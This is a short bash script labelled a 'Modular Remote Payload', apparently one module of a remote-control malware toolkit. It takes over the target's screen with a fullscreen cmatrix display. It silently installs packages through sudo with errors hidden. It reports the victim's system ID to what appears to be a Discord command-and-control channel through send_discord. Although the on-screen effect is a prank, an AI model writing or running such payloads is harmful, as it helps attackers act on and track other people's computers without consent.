#!/bin/bash
# ============================================================
# Matrix Rain Effect for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

# Check if cmatrix is installed
if command -v cmatrix &>/dev/null; then
    # Open new terminal with cmatrix
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal --maximize -- cmatrix -b &
    elif command -v konsole &>/dev/null; then
        konsole --fullscreen -e cmatrix -b &
    elif command -v xfce4-terminal &>/dev/null; then
        xfce4-terminal --maximize -e "cmatrix -b" &
    elif command -v xterm &>/dev/null; then
        xterm -fullscreen -e cmatrix -b &
    fi
    
    send_discord "🟢 **Matrix Rain on $SYSID**"
else
    # Install and run
    if command -v apt &>/dev/null; then
        sudo apt install -y cmatrix 2>/dev/null && gnome-terminal --maximize -- cmatrix -b &
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y cmatrix 2>/dev/null && gnome-terminal --maximize -- cmatrix -b &
    elif command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm cmatrix 2>/dev/null && gnome-terminal --maximize -- cmatrix -b &
    fi
    
    send_discord "🟢 **Matrix Rain Installed & Running on $SYSID**"
fi

